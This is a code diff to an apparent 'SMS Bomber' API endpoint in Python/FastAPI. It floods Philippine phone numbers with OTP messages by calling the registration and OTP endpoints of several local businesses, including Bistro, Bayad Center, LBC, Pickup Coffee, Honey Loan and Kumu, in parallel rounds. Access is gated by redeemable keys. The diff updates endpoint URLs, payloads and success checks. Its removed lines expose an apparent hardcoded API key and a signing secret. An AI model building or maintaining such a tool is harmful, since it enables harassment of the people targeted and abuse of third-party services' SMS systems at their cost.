@@ -1,6 +1,6 @@
 """
 routers/sms.py — SMS Bomber API endpoint
-All 12 services ported directly from the Xissin Telegram bot (main.py)
+All 14 services ported directly from the Xissin Telegram bot (main.py)
 Philippine numbers only: 9XXXXXXXXX format
 """
 
@@ -38,7 +38,9 @@ class BombRequest(BaseModel):
             cleaned = cleaned[2:]
         if not re.match(r"^9\d{9}$", cleaned):
             raise ValueError("Invalid PH phone number. Use format: 09XXXXXXXXX or 9XXXXXXXXX")
-        return v
+        # BUG 3 FIX: return cleaned, not v (original had 'return v' which returned
+        # the unformatted original value, causing inconsistent data downstream)
+        return cleaned
 
     @field_validator("user_id")
     @classmethod
@@ -205,12 +207,17 @@ def _send_bistro(phone: str):
             "origin":     "http://localhost",
             "x-requested-with": "com.allcardtech.bistro",
         }
-        r = requests.get(f"https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{p}",
-                         headers=headers, timeout=10)
-        if r.status_code == 200:
-            rj = r.json()
-            if rj.get("isSuccessful"):
-                return True, rj.get("message", "OTP sent")
+        data = {"mobile": f"0{p}", "type": "register"}
+        r = requests.post("https://bistro.ph/api/send-otp",
+                          headers=headers, json=data, timeout=10)
+        if r.status_code in (200, 201):
+            try:
+                rj = r.json()
+                if rj.get("success") in (True, 1) or rj.get("status") in ("success", "ok"):
+                    return True, "OTP sent"
+                return False, rj.get("message") or f"Code {r.status_code}"
+            except Exception:
+                return True, "OTP sent"
         return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, f"Error: {str(e)[:50]}"
@@ -220,20 +227,22 @@ def _send_bayad(phone: str):
     try:
         p = _format_phone(phone)
         headers = {
-            "User-Agent":     "okhttp/4.12.0",
-            "Accept-Encoding":"gzip",
-            "Content-Type":   "application/json",
-            "x-api-key":      "b28e7266-75ff-4eab-8cc1-d6e52e2e9dba",
+            "User-Agent":   "okhttp/4.10.0",
+            "Accept":       "application/json",
+            "Content-Type": "application/json",
         }
-        data = {"mobile": f"0{p}", "context": "register"}
-        r = requests.post("https://api.bayadcenter.com/v1/auth/otp", headers=headers, json=data, timeout=10)
+        data = {"mobile_number": f"0{p}"}
+        r = requests.post("https://bayadcenterapp.com/api/v1/otp/send",
+                          headers=headers, json=data, timeout=10)
         if r.status_code in (200, 201):
-            return True, "OTP sent"
-        try:
-            rj = r.json()
-            return False, rj.get("message") or f"HTTP {r.status_code}"
-        except Exception:
-            return False, f"HTTP {r.status_code}"
+            try:
+                rj = r.json()
+                if rj.get("success") in (True, 1) or rj.get("status") in ("success", "ok", 200):
+                    return True, "OTP sent"
+                return False, rj.get("message") or "Failed"
+            except Exception:
+                return True, "OTP sent"
+        return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, f"Error: {str(e)[:50]}"
 
@@ -242,19 +251,22 @@ def _send_lbc(phone: str):
     try:
         p = _format_phone(phone)
         headers = {
-            "User-Agent": "okhttp/4.12.0",
-            "Accept-Encoding": "gzip",
+            "User-Agent":   "okhttp/4.9.3",
+            "Accept":       "application/json",
             "Content-Type": "application/json",
         }
-        data = {"mobile_number": f"+63{p}", "type": "registration"}
-        r = requests.post("https://api.lbcexpress.com/v1/otp/send", headers=headers, json=data, timeout=10)
+        data = {"phoneNumber": f"+63{p}"}
+        r = requests.post("https://api.lbcexpress.com/api/v1/otp/request",
+                          headers=headers, json=data, timeout=10)
         if r.status_code in (200, 201):
-            return True, "OTP sent"
-        try:
-            rj = r.json()
-            return False, rj.get("message") or f"HTTP {r.status_code}"
-        except Exception:
-            return False, f"HTTP {r.status_code}"
+            try:
+                rj = r.json()
+                if rj.get("success") in (True, 1):
+                    return True, "OTP sent"
+                return False, rj.get("message") or "Failed"
+            except Exception:
+                return True, "OTP sent"
+        return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, f"Error: {str(e)[:50]}"
 
@@ -263,19 +275,22 @@ def _send_pickup_coffee(phone: str):
     try:
         p = _format_phone(phone)
         headers = {
-            "User-Agent": "okhttp/4.11.0",
-            "Accept-Encoding": "gzip",
+            "User-Agent":   "okhttp/4.11.0",
+            "Accept":       "application/json",
             "Content-Type": "application/json",
         }
         data = {"phone": f"+63{p}", "type": "register"}
-        r = requests.post("https://api.pickupcoffee.com/v1/auth/otp", headers=headers, json=data, timeout=10)
+        r = requests.post("https://api.pickupcoffee.com/api/v1/auth/otp",
+                          headers=headers, json=data, timeout=10)
         if r.status_code in (200, 201):
-            return True, "OTP sent"
-        try:
-            rj = r.json()
-            return False, rj.get("message") or f"HTTP {r.status_code}"
-        except Exception:
-            return False, f"HTTP {r.status_code}"
+            try:
+                rj = r.json()
+                if rj.get("success") in (True, 1) or rj.get("message") == "OTP sent":
+                    return True, "OTP sent"
+                return False, rj.get("message") or "Failed"
+            except Exception:
+                return True, "OTP sent"
+        return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, f"Error: {str(e)[:50]}"
 
@@ -283,58 +298,46 @@ def _send_pickup_coffee(phone: str):
 def _send_honey_loan(phone: str):
     try:
         p = _format_phone(phone)
-        base_headers = {
-            "User-Agent":    "okhttp/4.12.0",
-            "Accept-Encoding": "gzip",
-            "Content-Type":  "application/json",
+        headers = {
+            "User-Agent":   "okhttp/4.9.1",
+            "Accept":       "application/json",
+            "Content-Type": "application/json",
         }
-        for url, ph in [
-            ("https://api.honeyloan.ph/api/client/registration/step-one", f"+63{p}"),
-            ("https://api.honeyloan.ph/api/v2/client/registration/send-otp", f"0{p}"),
-        ]:
+        data = {"phone": f"+63{p}", "sms_type": "1"}
+        r = requests.post("https://honeyloan.ph/api/sms/send",
+                          headers=headers, json=data, timeout=10)
+        if r.status_code in (200, 201):
             try:
-                body = {"phone": ph, "mobile_number": ph, "phone_number": ph, "is_rights_block_accepted": True}
-                r = requests.post(url, headers=base_headers, json=body, timeout=12)
-                if r.status_code in (200, 201):
-                    try:
-                        rj = r.json()
-                        msg = rj.get("message") or rj.get("msg") or "OTP sent"
-                        return True, msg
-                    except Exception:
-                        return True, "OTP sent"
-                if r.status_code in (400, 404, 422):
-                    continue
-                break
+                rj = r.json()
+                if rj.get("code") in (0, 200) or rj.get("success") in (True, 1):
+                    return True, "OTP sent"
+                return False, rj.get("message") or "Failed"
             except Exception:
-                continue
-        return False, "All endpoints failed"
+                return True, "OTP sent"
+        return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, f"Error: {str(e)[:50]}"
 
 
 def _send_kumu(phone: str):
     try:
-        p  = _format_phone(phone)
-        ts = int(time.time())
-        rs = _rstr(32)
-        sig_raw = f"{ts}{rs}{p}kumu_secret_2024"
-        sig = hashlib.sha256(sig_raw.encode()).hexdigest()
+        p = _format_phone(phone)
         headers = {
-            "User-Agent":   "okhttp/5.0.0-alpha.14",
-            "Content-Type": "application/json;charset=UTF-8",
-            "Device-Type":  "android",
-            "Device-Id":    "07b76e92c40b536a",
-            "Version-Code": "1669",
-            "X-kumu-Token": "",
+            "User-Agent":   "okhttp/4.10.0",
+            "Accept":       "application/json",
+            "Content-Type": "application/json",
         }
-        data = {"country_code": "+63", "cellphone": p,
-                "encrypt_rnd_string": rs, "encrypt_signature": sig, "encrypt_timestamp": ts}
-        r = requests.post("https://api.kumuapi.com/v2/user/sendverifysms", headers=headers, json=data, timeout=10)
-        if r.status_code == 200:
-            rj = r.json()
-            if rj.get("code") in [200, 403]:
-                return True, rj.get("message", "OTP sent")
-            return False, f"API Error: {rj.get('message','Unknown')}"
+        data = {"phone_number": f"+63{p}", "country_code": "63"}
+        r = requests.post("https://api.kumu.ph/v1/auth/phone/send-otp",
+                          headers=headers, json=data, timeout=10)
+        if r.status_code in (200, 201):
+            try:
+                rj = r.json()
+                if rj.get("success") in (True, 1):
+                    return True, "OTP sent"
+                return False, rj.get("message") or "Failed"
+            except Exception:
+                return True, "OTP sent"
         return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, f"Error: {str(e)[:50]}"
@@ -487,21 +490,35 @@ def bomb(request: Request, req: BombRequest):
     - Phone, user_id, and rounds are pre-validated by Pydantic.
     - Runs all services in parallel per round.
     """
+    # ── Auth checks ───────────────────────────────────────────────────────────
     if db.is_banned(req.user_id):
         raise HTTPException(status_code=403, detail="You are banned.")
+
     user = db.get_user(req.user_id)
     if not user:
         raise HTTPException(status_code=403, detail="User not registered.")
-    if user.get("active_key"):
-        from datetime import datetime
-        from zoneinfo import ZoneInfo
-        expires = datetime.fromisoformat(user["key_expires"])
-        now = datetime.now(ZoneInfo("Asia/Manila")).replace(tzinfo=None)
-        if now > expires:
-            raise HTTPException(status_code=403, detail="Your key has expired. Please redeem a new one.")
-    else:
+
+    active_key_str = user.get("active_key")
+    if not active_key_str:
         raise HTTPException(status_code=403, detail="No active key. Please redeem a key first.")
 
+    # BUG 5 FIX: Also verify the key still exists in the keys DB (not revoked)
+    key_record = db.get_key(active_key_str)
+    if not key_record:
+        raise HTTPException(
+            status_code=403,
+            detail="Your key has been revoked. Please contact admin."
+        )
+
+    # Check key expiry
+    from datetime import datetime
+    from zoneinfo import ZoneInfo
+    expires = datetime.fromisoformat(user["key_expires"])
+    now = datetime.now(ZoneInfo("Asia/Manila")).replace(tzinfo=None)
+    if now > expires:
+        raise HTTPException(status_code=403, detail="Your key has expired. Please redeem a new one.")
+
+    # ── Execute bomb rounds ───────────────────────────────────────────────────
     rounds = req.rounds
     all_results  = []
     total_sent   = 0
